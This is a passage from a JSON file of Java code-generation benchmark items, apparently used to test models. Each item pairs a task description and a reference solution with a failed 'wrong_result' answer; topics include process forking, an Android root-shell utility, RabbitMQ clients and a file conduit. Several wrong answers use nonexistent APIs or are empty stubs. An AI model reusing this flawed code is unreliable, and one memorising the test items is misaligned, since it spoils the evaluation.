\" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    } catch (InterruptedException ex) {\n        out.println(\"<host VM has been interrupted waiting for forked VM: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString, File stdOut, File stdErr, boolean printOut, boolean printErr) throws BenchmarkException {\n    try {\n        ProcessBuilder processBuilder = new ProcessBuilder(commandString);\n        processBuilder.redirectOutput(stdOut);\n        processBuilder.redirectError(stdErr);\n        Process process = processBuilder.start();\n\n        if (printOut) {\n            BufferedReader outputReader = new BufferedReader(new FileReader(stdOut));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n            outputReader.close();\n        }\n\n        if (printErr) {\n            BufferedReader errorReader = new BufferedReader(new FileReader(stdErr));\n            String line;\n            while ((line = errorReader.readLine()) != null) {\n                System.err.println(line);\n            }\n            errorReader.close();\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new BenchmarkException(\"Process exited with code: \" + exitCode);\n        }\n\n        return reader.readResults();\n    } catch (IOException | InterruptedException e) {\n        throw new BenchmarkException(\"Error executing process: \" + e.getMessage(), e);\n    }\n}\n```"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Create a Java utility class for executing shell commands with root privileges and handling process execution in Android environments.\n\nClass Description: ShellUtils is a utility class designed to execute shell commands, particularly in rooted Android environments. It provides methods for finding system binaries, executing commands with or without root privileges, and handling process input/output streams. The class includes functionality for environment variable handling and process synchronization.\n\nAttributes:\n\nBINARY_PLACES: String[] - Array of common binary directories in Android systems for command lookup\nPYTHON_HOME: String - Path to Python installation directory\nDATA_DIR: File - Application data directory\nBUSYBOX_FILE: File - Path to busybox binary\nIS_ROOTED: Boolean - Cached flag indicating whether the device is rooted\n\nMethods:\n\nexecuteNoWait: executeNoWait(Map<String, String> env, String... command) -> Process - Executes a command without waiting for completion, with optional environment variables\nsudoNoWait: sudoNoWait(Map<String, String> env, String... command) -> Process - Executes a command with root privileges (using su) without waiting for completion\nwaitFor: waitFor(String command, Process process) -> String - Waits for process completion and returns output, throws exception if process fails\nfindCommand: findCommand(String command) -> String - Searches for a command in common binary directories and returns full path if found",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\n\npublic class ShellUtils {\n    private final static String[] BINARY_PLACES = {\"/data/bin/\", \"/system/bin/\", \"/system/xbin/\", \"/sbin/\",\n            \"/data/local/xbin/\", \"/data/local/bin/\", \"/system/sd/xbin/\", \"/system/bin/failsafe/\",\n            \"/data/local/\"};\n    private final static String PYTHON_HOME = \"/data/data/fq.router2/python\";\n    public static File DATA_DIR = new File(\"/data/data/fq.router2\");\n    public static File BUSYBOX_FILE = new File(DATA_DIR, \"busybox\");\n    private static Boolean IS_ROOTED = null;\n\n    public static Process executeNoWait(Map<String, String> env, String... command) throws IOException {\n        List<String> envp = new ArrayList<String>();\n        for (Map.Entry<String, String> entry : env.entrySet()) {\n            envp.add(entry.getKey() + \"=\" + entry.getValue());\n        }\n        return Runtime.getRuntime().exec(command, envp.toArray(new String[envp.size()]));\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) throws Exception {\n        if (Boolean.FALSE.equals(IS_ROOTED)) {\n            return executeNoWait(env, command);\n        }\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        Process process = processBuilder\n                .command(findCommand(\"su\"))\n                .redirectErrorStream(true)\n                .start();\n        OutputStreamWriter stdin = new OutputStreamWriter(process.getOutputStream());\n        try {\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                stdin.write(entry.getKey());\n                stdin.write(\"=\");\n                stdin.write(entry.getValue());\n                stdin.write(\" \");\n            }\n            for (String c : command) {\n                stdin.write(c);\n                stdin.write(\" \");\n            }\n            stdin.write(\"\\nexit\\n\");\n        } finally {\n            stdin.close();\n        }\n        return process;\n    }\n\n    public static String waitFor(String command, Process process) throws Exception {\n        BufferedReader stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        try {\n            String line;\n            while (null != (line = stdout.readLine())) {\n                output.append(line);\n                output.append(\"\\n\");\n            }\n        } finally {\n            stdout.close();\n        }\n        process.waitFor();\n        int exitValue = process.exitValue();\n        if (0 != exitValue) {\n            throw new Exception(\"failed to execute: \" + command + \", exit value: \" + exitValue + \", output: \" + output);\n        }\n        return output.toString();\n    }\n\n    public static String findCommand(String command) {\n        for (String binaryPlace : BINARY_PLACES) {\n            String path = binaryPlace + command;\n            if (new File(path).exists()) {\n                return path;\n            }\n        }\n        return command;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellUtils {\n    private static final String[] BINARY_PLACES = {\"/system/bin\", \"/system/xbin\", \"/vendor/bin\", \"/data/local/bin\", \"/data/local/xbin\", \"/sbin\", \"/usr/sbin\", \"/usr/bin\"};\n    private static final String PYTHON_HOME = \"/data/data/com.example.app/files/python\";\n    private static final File DATA_DIR = new File(\"/data/data/com.example.app/files\");\n    private static final File BUSYBOX_FILE = new File(\"/data/local/bin/busybox\");\n    private static final boolean IS_ROOTED = checkRoot();\n\n    public static Process executeNoWait(Map<String, String> env, String... command) throws IOException {\n        ProcessBuilder processBuilder = new ProcessBuilder(command);\n        if (env != null) {\n            processBuilder.environment().putAll(env);\n        }\n        return processBuilder.start();\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) throws IOException {\n        List<String> sudoCommand = new ArrayList<>();\n        sudoCommand.add(\"su\");\n        sudoCommand.addAll(Arrays.asList(command));\n        ProcessBuilder processBuilder = new ProcessBuilder(sudoCommand);\n        if (env != null) {\n            processBuilder.environment().putAll(env);\n        }\n        return processBuilder.start();\n    }\n\n    public static String waitFor(String command, Process process) throws IOException, InterruptedException {\n        StringBuilder output = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new IOException(\"Command failed with exit code \" + exitCode + \": \" + command);\n        }\n        return output.toString();\n    }\n\n    public static String findCommand(String command) {\n        for (String dir : BINARY_PLACES) {\n            File file = new File(dir, command);\n            if (file.exists() && file.canExecute()) {\n                return file.getAbsolutePath();\n            }\n        }\n        return null;\n    }\n\n    private static boolean checkRoot() {\n        boolean rooted = false;\n        try {\n            Process process = new ProcessBuilder(\"su\", \"-c\", \"id\").start();\n            int exitCode = process.waitFor();\n            rooted = exitCode == 0;\n        } catch (Exception e) {\n            rooted = false;\n        }\n        return rooted;\n    }\n}"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Java class that manages the execution of external commands, handles their input/output streams, and provides synchronization capabilities for waiting until the command completes.\n\nClass Description: The ExtCmd class provides functionality to execute external system commands, manage their input/output streams, and wait for their completion. It includes features for logging, condition checking before execution, and notification listeners for process completion.\n\nAttributes:\n\nconditionsWithDescriptions: Map<ExtCmdCondition, String> - Stores conditions that must be met before command execution along with their descriptions\nextCmdEndedListenerSet: Set<ExtCmdEndedListener> - Collection of listeners to be notified when command execution ends\noutReceiver: OutputReceiver - Handles the standard output stream from the executed command\nerrReceiver: OutputReceiver - Handles the error output stream from the executed command\nerrLog: ErrorReporter - Logger for command execution information\nstartTime: long - Timestamp when command execution started\nexecCommand: String[] - The command to be executed\nexecCommandStr: String - String representation of the command\nlogExecution: boolean - Flag to enable/disable execution logging\n\nMethods:\n\nexec(ProcessBuilder.Redirect, File, String...) -> OutputStream - Executes an external command with specified input redirection, working directory, and command arguments. Returns the process's output stream for writing input.\nsyncProcess() -> OutputData - Waits for the command to complete and returns its output data including stdout, stderr, and exit code.\ncheckForConditions() -> void - Internal method to verify all execution conditions are met before starting a command.\n\nNested Classes:\n\nOutputData: Contains the results of command execution including stdout, stderr, and exit code\nExtCmdCondition: Interface for defining pre-execution conditions\nExtCmdEndedListener: Interface for command completion notification callbacks",
    "Canonical_solution": "import com.linbit.ChildProcessTimeoutException;\nimport com.linbit.linstor.logging.ErrorReporter;\nimport com.linbit.timer.Action;\nimport com.linbit.timer.Timer;\nimport com.linbit.utils.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\n\nimport org.slf4j.MDC;\n\npublic class ExtCmd extends ChildProcessHandler\n{\n    private final Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private final Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n\n    private String[] execCommand;\n    private String execCommandStr;\n\n    private boolean logExecution = true;\n\n    public ExtCmd(Timer<String, Action<String>> timer, ErrorReporter errLogRef)\n    {\n        super(timer);\n        conditionsWithDescriptions = new HashMap<>();\n        outReceiver = null;\n        errReceiver = null;\n        errLog = errLogRef;\n        extCmdEndedListenerSet = new HashSet<>();\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect stdinRedirect, File directory, String... command)\n        throws IOException\n    {\n        execCommand = command;\n        execCommandStr = StringUtils.joinShellQuote(command);\n\n        if (logExecution)\n        {\n            errLog.logDebug(\"Executing command: %s\", execCommandStr);\n        }\n\n        ProcessBuilder pBuilder = new ProcessBuilder();\n        pBuilder.directory(directory);\n        pBuilder.command(command);\n        pBuilder.redirectError(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectInput(stdinRedirect);\n        Process child;\n        synchronized (conditionsWithDescriptions)\n        {\n            checkForConditions();\n            child = pBuilder.start();\n            startTime = System.currentTimeMillis();\n            setChild(child);\n            outReceiver = new OutputReceiver(\n                child.getInputStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n            errReceiver = new OutputReceiver(\n                child.getErrorStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n        }\n        new Thread(outReceiver).start();\n        new Thread(errReceiver).start();\n\n        return child.getOutputStream();\n    }\n\n    private void checkForConditions()\n    {\n        for (Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet())\n        {\n            if (!entry.getKey().isMet(this))\n            {\n                throw new ExtCmdConditionNotFullfilledException(entry.getValue() + \", command: \" + this.execCommandStr);\n            }\n        }\n    }\n\n    public OutputData syncProcess() throws IOException, ChildProcessTimeoutException\n    {\n        OutputData outData;\n        try\n        {\n            int exitCode = waitFor();\n            outReceiver.finish();\n            errReceiver.finish();\n            outData = new OutputData(\n                execCommand,\n                outReceiver.getData(),\n                errReceiver.getData(),\n                exitCode\n            );\n\n            if (logExecution)\n            {\n                errLog.logTrace(\n                    \"External command finished in %dms: %s\",\n                    (System.currentTimeMillis() - startTime),\n                    execCommandStr\n                );\n            }\n\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this);\n            }\n        }\n        catch (IOException | ChildProcessTimeoutException exc)\n        {\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this, exc);\n            }\n            throw exc;\n        }\n        return outData;\n    }\n\n    public static class OutputData\n    {\n        public final String[] executedCommand;\n        public final byte[] stdoutData;\n        public final byte[] stderrData;\n        public final int exitCode;\n\n        public OutputData(String[] executeCmd, byte[] out, byte[] err, int retCode)\n        {\n            executedCommand = executeCmd;\n            stdoutData = out;\n            stderrData = err;\n            exitCode = retCode;\n        }\n    }\n\n    public interface ExtCmdCondition\n    {\n        boolean isMet(ExtCmd extCmd);\n    }\n\n    public interface ExtCmdEndedListener\n    {\n        void extCmdEnded(ExtCmd extCmd);\n        void extCmdEnded(ExtCmd extCmd, Exception exc);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ExtCmd {\n    private Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n    private String[] execCommand;\n    private String execCommandStr;\n    private boolean logExecution;\n\n    public OutputStream exec(ProcessBuilder.Redirect inputRedirect, File workingDir, String... args) {\n        // Implementation for executing the command\n        return null;\n    }\n\n    public OutputData syncProcess() {\n        // Implementation for waiting for the process to complete\n        return new OutputData();\n    }\n\n    private void checkForConditions() {\n        // Implementation for checking pre-execution conditions\n    }\n\n    public static class OutputData {\n        private String stdout;\n        private String stderr;\n        private int exitCode;\n\n        // Getters and setters\n    }\n\n    public interface ExtCmdCondition {\n        boolean isMet();\n        String getDescription();\n    }\n\n    public interface ExtCmdEndedListener {\n        void onCommandEnded(OutputData data);\n    }\n}"
  },
  {
    "Task_id": 304,
    "Instruction": "Task Description: Implement a RabbitMQ message consumer in Java that connects to a RabbitMQ broker, declares a queue, and continuously consumes messages from that queue.\n\nClass Description: The MessageConsumer class provides functionality to connect to a RabbitMQ broker, initialize a message queue, consume messages from the queue, and properly close connections when finished.\n\nAttributes:\n- ROUTING_KEY: String - The name of the queue to consume messages from\n- factory: ConnectionFactory - RabbitMQ connection factory for broker configuration\n- connection: Connection - Active connection to the RabbitMQ broker\n- channel: Channel - Communication channel for message operations\n\nMethods:\n- MessageConsumer() - Constructor - Initializes the ConnectionFactory with default host settings\n- initializeConnection() throws Exception -> void - Establishes connection to RabbitMQ broker and creates a channel\n- startConsuming() throws Exception -> void - Starts consuming messages from the queue and prints received messages\n- close() throws Exception -> void - Closes the channel and connection to the RabbitMQ broker",
    "Canonical_solution": "import com.rabbitmq.client.*;\n\npublic class MessageConsumer {\n\n    private final static String ROUTING_KEY = \"SAMPLE_RABBITMQ\";\n    private ConnectionFactory factory;\n    private Connection connection;\n    private Channel channel;\n\n    public MessageConsumer() {\n        this.factory = new ConnectionFactory();\n        this.factory.setHost(\"127.0.0.1\");\n    }\n\n    public void initializeConnection() throws Exception {\n        this.connection = factory.newConnection();\n        this.channel = connection.createChannel();\n        channel.queueDeclare(ROUTING_KEY, false, false, false, null);\n    }\n\n    public void startConsuming() throws Exception {\n        System.out.println(\"C [*] Waiting for messages. To exit press CTRL+C\");\n        Consumer consumer = new DefaultConsumer(channel) {\n            @Override\n            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n                String message = new String(body, \"UTF-8\");\n                System.out.println(\"Consumer [x] Received '\" + message + \"'\");\n            }\n        };\n        channel.basicConsume(ROUTING_KEY, true, consumer);\n    }\n\n    public void close() throws Exception {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 41,
    "wrong_result": "```java\nimport com.rabbitmq.client.*;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeoutException;\n\npublic class MessageConsumer {\n    public static final String ROUTING_KEY = \"message_queue\";\n    private ConnectionFactory factory;\n    private Connection connection;\n    private Channel channel;\n\n    public MessageConsumer() {\n        this.factory = new ConnectionFactory();\n        this.factory.setHost(\"localhost\");\n    }\n\n    public void initializeConnection() throws Exception {\n        this.connection = factory.newConnection();\n        this.channel = connection.createChannel();\n        channel.queueDeclare(ROUTING_KEY, false, false, false, null);\n    }\n\n    public void startConsuming() throws Exception {\n        DeliverCallback deliverCallback = (consumerTag, delivery) -> {\n            String message = new String(delivery.getBody(), \"UTF-8\");\n            System.out.println(\"Received: \" + message);\n        };\n\n        channel.basicConsume(ROUTING_KEY, true, deliverCallback, consumerTag -> {});\n    }\n\n    public void close() throws Exception {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 305,
    "Instruction": "Task Description: Implement a RabbitMQ message producer in Java that sends messages to a specified exchange.\n\nClass Description: A service class that handles the production and sending of messages to a RabbitMQ exchange using a fanout pattern. The class manages connection setup, message publishing, and resource cleanup.\n\nAttributes:\n- EXCHANGE_NAME: String - The name of the RabbitMQ exchange to which messages will be published.\n\nMethods:\n- produceMessage(String message) -> String - Publishes the given message to the configured RabbitMQ exchange. Returns a simple response string.\n  - Input Parameters:\n    - message: String - The message content to be published\n  - Return Type: String - A simple response string (\"response\") indicating completion",
    "Canonical_solution": "import com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.visualpathit.account.utils.RabbitMqUtil;\nimport com.rabbitmq.client.Channel;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeoutException;\n\n@Service\npublic class ProducerServiceImpl implements ProducerService {\n\n    private static final String EXCHANGE_NAME = \"messages\";\n\n    @Override\n    public String produceMessage(String message) {\n        try {\n            ConnectionFactory factory = new ConnectionFactory();\n            factory.setHost(RabbitMqUtil.getRabbitMqHost());\n            factory.setPort(Integer.parseInt(RabbitMqUtil.getRabbitMqPort()));\n            factory.setUsername(RabbitMqUtil.getRabbitMqUser());\n            factory.setPassword(RabbitMqUtil.getRabbitMqPassword());\n            Connection connection = factory.newConnection();\n            Channel channel = connection.createChannel();\n            channel.exchangeDeclare(EXCHANGE_NAME, \"fanout\");\n            channel.basicPublish(EXCHANGE_NAME, \"\", null, message.getBytes());\n            channel.close();\n            connection.close();\n        } catch (IOException io) {\n            io.printStackTrace();\n        } catch (TimeoutException toe) {\n            toe.printStackTrace();\n        }\n        return \"response\";\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 40,
    "wrong_result": "```java\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\n\npublic class RabbitMQProducer {\n    private static final String EXCHANGE_NAME = \"fanout_exchange\";\n\n    public String produceMessage(String message) {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(\"localhost\");\n        try (Connection connection = factory.newConnection();\n             Channel channel = connection.createChannel()) {\n            channel.exchangeDeclare(EXCHANGE_NAME, \"fanout\");\n            channel.basicPublish(EXCHANGE_NAME, \"\", null, message.getBytes(\"UTF-8\"));\n            return \"Message sent: \" + message;\n        } catch (Exception e) {\n            return \"Failed to send message: \" + e.getMessage();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a RabbitMQ producer class in Java that can connect to a RabbitMQ broker, send messages to a specified queue, and properly manage resources.\n\nClass Description: The RabbitMQProducer class provides functionality to establish a connection with a RabbitMQ message broker, declare a queue, send messages to that queue, and handle connection cleanup. It supports both single message and batch message sending operations.\n\nAttributes:\n- host: String - The hostname or IP address of the RabbitMQ server\n- port: int - The port number of the RabbitMQ server\n- username: String - The username for authentication with RabbitMQ\n- password: String - The password for authentication with RabbitMQ\n- queueName: String - The name of the queue to send messages to\n- durable: boolean - Whether the queue should survive server restarts\n- connection: Connection - The RabbitMQ connection object\n- channel: Channel - The RabbitMQ channel object for message operations\n\nMethods:\n- RabbitMQProducer(Map<String, String> config) -> void - Constructor that initializes the producer with configuration parameters\n- connect() -> void - Establishes connection to RabbitMQ and creates a channel\n- sendMessage(String message) -> void - Sends a single message to the declared queue\n- sendMessages(String[] messages) -> void - Sends multiple messages to the declared queue\n- close() -> void - Closes the channel and connection to release resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.TimeoutException;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.MessageProperties;\n\npublic class RabbitMQProducer {\n\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private String queueName;\n    private boolean durable;\n    private Connection connection;\n    private Channel channel;\n\n    public RabbitMQProducer(Map<String, String> config) {\n        this.host = config.get(\"rabbitmq_host\");\n        this.port = Integer.parseInt(config.get(\"rabbitmq_port\"));\n        this.username = config.get(\"rabbitmq_user\");\n        this.password = config.get(\"rabbitmq_pass\");\n        this.queueName = config.get(\"rabbitmq_queuename\");\n        this.durable = config.get(\"rabbitmq_durable\").equals(\"true\");\n    }\n\n    public void connect() throws IOException, TimeoutException {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(host);\n        factory.setPort(port);\n        factory.setUsername(username);\n        factory.setPassword(password);\n        connection = factory.newConnection();\n        channel = connection.createChannel();\n        channel.queueDeclare(queueName, durable, false, false, null);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        channel.basicPublish(\"\", queueName, \n            MessageProperties.PERSISTENT_TEXT_PLAIN,\n            message.getBytes()\n        );\n    }\n\n    public void sendMessages(String[] messages) throws IOException {\n        for (String message : messages) {\n            sendMessage(message);\n        }\n    }\n\n    public void close() throws IOException, TimeoutException {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 40,
    "wrong_result": "{\n  \"class\": \"RabbitMQProducer\",\n  \"attributes\": {\n    \"host\": \"String\",\n    \"port\": \"int\",\n    \"username\": \"String\",\n    \"password\": \"String\",\n    \"queueName\": \"String\",\n    \"durable\": \"boolean\",\n    \"connection\": \"Connection\",\n    \"channel\": \"Channel\"\n  },\n  \"methods\": {\n    \"RabbitMQProducer(Map<String, String> config)\": \"void\",\n    \"connect()\": \"void\",\n    \"sendMessage(String message)\": \"void\",\n    \"sendMessages(String[] messages)\": \"void\",\n    \"close()\": \"void\"\n  }\n}"
  },
  {
    "Task_id": 31,
    "Instruction": "Task Description: Create a Java class that implements StreamSinkConduit to handle file channel operations for writing data to a file, with proper management of write operations and resource cleanup.\n\nClass Description: FileConduitTarget is a class that implements StreamSinkConduit to provide file channel operations for writing data. It manages file writes, transfers, and resource cleanup while integrating with an HTTP server exchange for thread management.\n\nAttributes:\n- fileChannel: FileChannel - The file channel used for writing data to the file\n- exchange: HttpServerExchange - The HTTP server exchange for thread management\n- writeReadyHandler: WriteReadyHandler - Handler for write readiness events\n- writesResumed: boolean - Flag indicating whether writes are currently resumed\n\nMethods:\n- transferFrom(FileChannel, long, long) -> long - Transfers data from the given file channel to this file channel\n- transferFrom(StreamSourceChannel, long, ByteBuffer) -> long - Transfers data from the given stream source channel to this file channel\n- write(ByteBuffer) -> int - Writes data from the given byte buffer to the file channel\n- write(ByteBuffer[], int, int) -> long - Writes data from the given byte buffer array to the file channel\n- writeFinal(ByteBuffer) -> int - Performs a final write operation from the given byte buffer\n- writeFinal(ByteBuffer[], int, int) -> long - Performs a final write operation from the given byte buffer array\n- terminateWrites() -> void - Closes the file channel to terminate writes\n- isWriteShutdown() -> boolean - Checks if writes are shutdown (file channel closed)\n- resumeWrites() -> void - Resumes write operations\n- suspendWrites() -> void - Suspends write operations\n- wakeupWrites() -> void - Wakes up pending write operations\n- isWriteResumed() -> boolean - Checks if writes are currently resumed\n- awaitWritable() -> void - Waits for the channel to become writable (no-op implementation)\n- awaitWritable(long, TimeUnit) -> void - Waits for the channel to become writable with timeout (no-op implementation)\n- getWriteThread() -> XnioIoThread - Gets the I/O thread from the exchange\n- setWriteReadyHandler(WriteReadyHandler) -> void - Sets the write ready handler\n- truncateWrites() -> void - Closes the file channel to truncate writes\n- flush() -> boolean - Flushes any buffered data (always returns true)\n- getWorker() -> XnioWorker - Gets the worker from the exchange connection",
    "Canonical_solution": "import io.undertow.server.HttpServerExchange;\nimport io.undertow.util.ImmediateConduitFactory;\nimport org.xnio.IoUtils;\nimport org.xnio.XnioIoThread;\nimport org.xnio.XnioWorker;\nimport org.xnio.channels.StreamSourceChannel;\nimport org.xnio.conduits.ConduitStreamSinkChannel;\nimport org.xnio.conduits.Conduits;\nimport org.xnio.conduits.StreamSinkConduit;\nimport org.xnio.conduits.WriteReadyHandler;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.TimeUnit;\n\npublic class FileConduitTarget implements StreamSinkConduit {\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed = false;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n    }\n\n    @Override\n    public long transferFrom(FileChannel fileChannel, long l, long l2) throws IOException {\n        return this.fileChannel.transferFrom(fileChannel, l, l2);\n    }\n\n    @Override\n    public long transferFrom(StreamSourceChannel streamSourceChannel, long l, ByteBuffer byteBuffer) throws IOException {\n        return IoUtils.transfer(streamSourceChannel, l, byteBuffer, fileChannel);\n    }\n\n    @Override\n    public int write(ByteBuffer byteBuffer) throws IOException {\n        return fileChannel.write(byteBuffer);\n    }\n\n    @Override\n    public long write(ByteBuffer[] byteBuffers, int i, int i2) throws IOException {\n        return fileChannel.write(byteBuffers, i, i2);\n    }\n\n    @Override\n    public int writeFinal(ByteBuffer src) throws IOException {\n        return Conduits.writeFinalBasic(this, src);\n    }\n\n    @Override\n    public long writeFinal(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return Conduits.writeFinalBasic(this, srcs, offset, length);\n    }\n\n    @Override\n    public void terminateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean isWriteShutdown() {\n        return !fileChannel.isOpen();\n    }\n\n    @Override\n    public void resumeWrites() {\n        wakeupWrites();\n    }\n\n    @Override\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    @Override\n    public void wakeupWrites() {\n        if (writeReadyHandler != null) {\n            writesResumed = true;\n            while (writesResumed && writeReadyHandler != null) {\n                writeReadyHandler.writeReady();\n            }\n        }\n    }\n\n    @Override\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    @Override\n    public void awaitWritable() throws IOException {\n    }\n\n    @Override\n    public void awaitWritable(long l, TimeUnit timeUnit) throws IOException {\n    }\n\n    @Override\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    @Override\n    public void setWriteReadyHandler(WriteReadyHandler writeReadyHandler) {\n        this.writeReadyHandler = writeReadyHandler;\n    }\n\n    @Override\n    public void truncateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean flush() throws IOException {\n        return true;\n    }\n\n    @Override\n    public XnioWorker getWorker() {\n        return exchange.getConnection().getWorker();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.StreamSinkChannel;\nimport java.nio.channels.StreamSourceChannel;\nimport java.util.concurrent.TimeUnit;\n\npublic class FileConduitTarget implements StreamSinkConduit {\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n    }\n\n    @Override\n    public long transferFrom(FileChannel src, long position, long count) throws IOException {\n        return fileChannel.transferFrom(src, position, count);\n    }\n\n    @Override\n    public long transferFrom(StreamSourceChannel source, long count, ByteBuffer throughBuffer) throws IOException {\n        return fileChannel.transferFrom(source, count, throughBuffer);\n    }\n\n    @Override\n    public int write(ByteBuffer src) throws IOException {\n        return fileChannel.write(src);\n    }\n\n    @Override\n    public long write(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return fileChannel.write(srcs, offset, length);\n    }\n\n    @Override\n    public int writeFinal(ByteBuffer src) throws IOException {\n        return fileChannel.write(src);\n    }\n\n    @Override\n    public long writeFinal(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return fileChannel.write(srcs, offset, length);\n    }\n\n    @Override\n    public void terminateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean isWriteShutdown() {\n        return !fileChannel.isOpen();\n    }\n\n    @Override\n    public void resumeWrites() {\n        writesResumed = true;\n        if (writeReadyHandler != null) {\n            writeReadyHandler.handleWriteReady();\n        }\n    }\n\n    @Override\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    @Override\n    public void wakeupWrites() {\n        if (writeReadyHandler != null) {\n            writeReadyHandler.handleWriteReady();\n        }\n    }\n\n    @Override\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    @Override\n    public void awaitWritable() {\n        // No-op implementation\n    }\n\n    @Override\n    public void awaitWritable(long time, TimeUnit timeUnit) {\n        // No-op implementation\n    }\n\n    @Override\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    @Override\n    public void setWriteReadyHandler(WriteReadyHandler handler) {\n        this.writeReadyHandler = handler;\n    }\n\n    @Override\n    public void truncateWrites() throws IOException {\n        fileChannel.truncate(0);\n    }\n\n    @Override\n    public boolean flush() {\n        return true;\n    }\n\n    @Override\n    public XnioWorker getWorker() {\n        return exchange.getConnection().getWorker();\n    }\n}\n```"
  },
  {
    "Task_id": 310,
